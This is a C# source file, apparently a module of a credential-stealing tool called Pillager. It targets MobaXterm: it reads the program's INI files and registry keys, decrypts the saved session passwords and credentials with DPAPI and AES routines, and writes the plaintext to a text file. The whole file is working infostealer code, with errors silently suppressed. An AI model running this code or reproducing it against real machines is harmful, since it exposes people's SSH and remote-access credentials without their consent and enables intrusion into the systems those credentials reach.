using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using Pillager.Helper;

namespace Pillager.Tools
{
    internal class MobaXterm : ICommand
    {
        public string FromINI(List<string> pathlist)
        {
            StringBuilder stringBuilder = new StringBuilder();
            foreach (var path in pathlist)
            {
                try
                {
                    var p = Pixini.Load(path);
                    string SessionP = p.Get("SessionP", "Misc", "");
                    if (string.IsNullOrEmpty(SessionP)) continue;
                    string Sesspasses = p.Get((Environment.UserName + "@" + Environment.MachineName).Replace(" ",""), "Sesspass", "");

                    List<string> passwordlist = new List<string>();
                    p.sectionMap.TryGetValue("passwords", out var passwords);
                    if (passwords!=null)
                    {
                        foreach (var password in passwords)
                        {
                            string key = password.key;
                            string value = password.value;
                            try
                            {
                                if (string.IsNullOrEmpty(Sesspasses))
                                {
                                    string decryptvalue = DecryptWithoutMP(SessionP, value);
                                    passwordlist.Add(key + "=" + decryptvalue);
                                }
                                else
                                {
                                    string decryptvalue = DecryptWithMP(SessionP, Sesspasses, value);
                                    passwordlist.Add(key + "=" + decryptvalue);
                                }
                            }
                            catch { }
                        }
                    }

                    List<string> credentiallist = new List<string>();
                    p.sectionMap.TryGetValue("credentials", out var credentials);
                    if (credentials!=null)
                    {
                        foreach (var credential in credentials)
                        {
                            string name = credential.key;
                            string value = credential.value;
                            try
                            {
                                string username = value.Split(':')[0];
                                if (string.IsNullOrEmpty(Sesspasses))
                                {
                                    string decryptvalue = DecryptWithoutMP(SessionP, value.Split(':')[1]);
                                    credentiallist.Add(name + "=" + username + ":" + decryptvalue);
                                }
                                else
                                {
                                    string decryptvalue = DecryptWithMP(SessionP, Sesspasses, value.Split(':')[1]);
                                    credentiallist.Add(name + "=" + username + ":" + decryptvalue);
                                }
                            }
                            catch { }
                        }
                    }
                    
                    if (passwordlist?.Count > 0)
                    {
                        stringBuilder.AppendLine("Passwords:");
                        foreach (var password in passwordlist)
                        {
                            stringBuilder.AppendLine(password);
                        }
                        stringBuilder.AppendLine("");
                    }
                    if (credentiallist?.Count > 0)
                    {
                        stringBuilder.AppendLine("Credentials:");
                        foreach (var credential in credentiallist)
                        {
                            stringBuilder.AppendLine(credential);
                        }
                        stringBuilder.AppendLine("");
                    }
                }
                catch { }
            }

            return stringBuilder.ToString();
        }

        public string FromRegistry()
        {
            StringBuilder stringBuilder = new StringBuilder();
            List<string> passwordlist = new List<string>();
            List<string> credentiallist = new List<string>();
            try
            {
                RegistryKey MobaXtermkey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm");
                string SessionP = (string)MobaXtermkey.GetValue("SessionP");
                string masterpassword = "";
                try
                {
                    string temp = Environment.UserName + "@" + Environment.MachineName;
                    masterpassword = (string)MobaXtermkey.OpenSubKey("M").GetValue(temp.Replace(" ",""));
                }
                catch { }
                try
                {
                    foreach (string SubkeyName in MobaXtermkey.OpenSubKey("P").GetValueNames())
                    {
                        try
                        {
                            string key = SubkeyName;
                            string value = (string)MobaXtermkey.OpenSubKey("P").GetValue(SubkeyName);
                            if (string.IsNullOrEmpty(masterpassword))
                            {
                                string decryptvalue = DecryptWithoutMP(SessionP, value);
                                passwordlist.Add(key + "=" + decryptvalue);
                            }
                            else
                            {
                                string decryptvalue = DecryptWithMP(SessionP, masterpassword, value);
                                passwordlist.Add(key + "=" + decryptvalue);
                            }
                        }
                        catch { }
                    }
                }
                catch { }
                try
                {
                    foreach (string SubkeyName in MobaXtermkey.OpenSubKey("C").GetValueNames())
                    {
                        try
                        {
                            string key = SubkeyName;
                            string value = (string)MobaXtermkey.OpenSubKey("C").GetValue(SubkeyName);
                            if (string.IsNullOrEmpty(masterpassword))
                            {
                                string decryptvalue = DecryptWithoutMP(SessionP, value);
                                credentiallist.Add(key + "=" + decryptvalue);
                            }
                            else
                            {
                                string decryptvalue = DecryptWithMP(SessionP, masterpassword, value);
                                credentiallist.Add(key + "=" + decryptvalue);
                            }
                        }
                        catch { }
                    }
                }
                catch { }
                if (passwordlist.Count > 0)
                {
                    stringBuilder.AppendLine("Passwords:");
                    foreach (var password in passwordlist)
                    {
                        stringBuilder.AppendLine(password);
                    }
                    stringBuilder.AppendLine("");
                }
                if (credentiallist.Count > 0)
                {
                    stringBuilder.AppendLine("Credentials:");
                    foreach (var credential in credentiallist)
                    {
                        stringBuilder.AppendLine(credential);
                    }
                    stringBuilder.AppendLine("");
                }
                return stringBuilder.ToString();
            }
            catch { }            
            return null;
        }

        public string DecryptWithMP(string SessionP, string Sesspasses, string Ciphertext)
        {
            byte[] bytes = Convert.FromBase64String(Sesspasses);
            //byte[] key = KeyCrafter(SessionP);
            byte[] front = { 0x01, 0x00, 0x00, 0x00, 0xd0, 0x8c, 0x9d, 0xdf, 0x01, 0x15, 0xd1, 0x11, 0x8c, 0x7a, 0x00, 0xc0, 0x4f, 0xc2, 0x97, 0xeb };
            byte[] all = new byte[bytes.Length + front.Length];
            for (int i = 0; i < front.Length; i++)
            {
                all[i] = front[i];
            }
            for (int i = 0; i < bytes.Length; i++)
            {
                all[front.Length + i] = bytes[i];
            }
            byte[] temp = ProtectedData.Unprotect(all, Encoding.UTF8.GetBytes(SessionP), DataProtectionScope.CurrentUser);
            string temp2 = Encoding.UTF8.GetString(temp);
            byte[] output = Convert.FromBase64String(temp2);

            byte[] text = Convert.FromBase64String(Ciphertext);

            byte[] aeskey = new byte[32];
            Array.Copy(output, aeskey, 32);
            byte[] temp3 = new byte[16];

            byte[] ivbytes = AESEncrypt(temp3, aeskey);
            byte[] iv = new byte[16];
            Array.Copy(ivbytes, iv, 16);
            string t1 = AESDecrypt(text, aeskey, iv);
            return t1;
        }

        public string DecryptWithoutMP(string SessionP, string Ciphertext)
        {
            byte[] key = KeyCrafter(SessionP);
            byte[] text = Encoding.ASCII.GetBytes(Ciphertext);

            List<byte> bytes1 = new List<byte>();
            foreach (var t in text)
            {
                if (key.ToList().Contains(t))
                {
                    bytes1.Add(t);
                }
            }
            byte[] ct = bytes1.ToArray();

            List<byte> ptarray = new List<byte>();

            if (ct.Length % 2 == 0)
            {
                for (int i = 0; i < ct.Length; i += 2)
                {
                    int l = key.ToList().FindIndex(a => a == ct[i]);
                    key = RightBytes(key);
                    int h = key.ToList().FindIndex(a => a == ct[i + 1]);
                    key = RightBytes(key);
                    ptarray.Add((byte)(16 * h + l));
                }
                byte[] pt = ptarray.ToArray();
                return Encoding.UTF8.GetString(pt);
            }
            return "";
        }

        public byte[] RightBytes(byte[] input)
        {
            byte[] bytes = new byte[input.Length];
            for (int i = 0; i < input.Length-1; i++)
            {
                bytes[i + 1] = input[i];
            }
            bytes[0] = input[input.Length - 1];
            return bytes;
        }

        public List<string> GetINI()
        {
            List<string> pathlist = new List<string>();
            foreach (var process in Process.GetProcesses())
            {
                if (process.ProcessName.Contains("MobaXterm"))
                {
                    try
                    {
                        pathlist.Add(Path.Combine(Path.GetDirectoryName(process.MainModule.FileName), "MobaXterm.ini"));
                    }
                    catch { }
                }
            }
            string installedpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MobaXterm\\MobaXterm.ini");
            if (File.Exists(installedpath)) { pathlist.Add(installedpath); }
            return pathlist;
        }

        private string AESDecrypt(byte[] encryptedBytes, byte[] bKey, byte[] iv)
        {
            MemoryStream mStream = new MemoryStream(encryptedBytes);
            RijndaelManaged aes = new RijndaelManaged();
            aes.Mode = CipherMode.CFB;
            aes.FeedbackSize = 8;
            aes.Padding = PaddingMode.Zeros;
            aes.Key = bKey;
            aes.IV = iv;
            CryptoStream cryptoStream = new CryptoStream(mStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
            try
            {
                byte[] tmp = new byte[encryptedBytes.Length + 32];
                int len = cryptoStream.Read(tmp, 0, encryptedBytes.Length + 32);
                byte[] ret = new byte[len];
                Array.Copy(tmp, 0, ret, 0, len);
                return Encoding.UTF8.GetString(ret);
            }
            finally
            {
                cryptoStream.Close();
                mStream.Close();
                aes.Clear();
            }
        }

        private byte[] AESEncrypt(byte[] plainBytes, byte[] bKey)
        {
            MemoryStream mStream = new MemoryStream();
            RijndaelManaged aes = new RijndaelManaged();

            aes.Mode = CipherMode.ECB;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = bKey;
            CryptoStream cryptoStream = new CryptoStream(mStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
            try
            {
                cryptoStream.Write(plainBytes, 0, plainBytes.Length);
                cryptoStream.FlushFinalBlock();
                return mStream.ToArray();
            }
            finally
            {
                cryptoStream.Close();
                mStream.Close();
                aes.Clear();
            }
        }

        public byte[] KeyCrafter(string SessionP)
        {
            while (SessionP.Length < 20)
            {
                SessionP += SessionP;
            }
            string s1 = SessionP;
            string s2 = Environment.UserName + Environment.UserDomainName;
            while (s2.Length < 20)
            {
                s2 += s2;
            }
            string[] key_space = { s1.ToUpper(), s1.ToUpper(), s1.ToLower(), s1.ToLower() };
            byte[] key = Encoding.UTF8.GetBytes("0d5e9n1348/U2+67");

            for (int i = 0; i < key.Length; i++)
            {
                byte b = (byte)key_space[(i + 1) % (key_space).Length][i];
                if (!key.Contains(b) && Encoding.UTF8.GetBytes("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/").Contains(b))
                {
                    key[i] = b;
                }
            }
            return key;
        }

        public override void Save(string path)
        {
            try
            {
                List<string> pathlist=GetINI();
                if (pathlist.Count==0) return;
                string savepath = Path.Combine(path, "MobaXterm");
                Directory.CreateDirectory(savepath);
                string registryout = FromRegistry();
                string iniout = FromINI(pathlist);
                string output = registryout + iniout;
                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, "MobaXterm.txt"), output, Encoding.UTF8);
            }
            catch { }
        }
    }
}
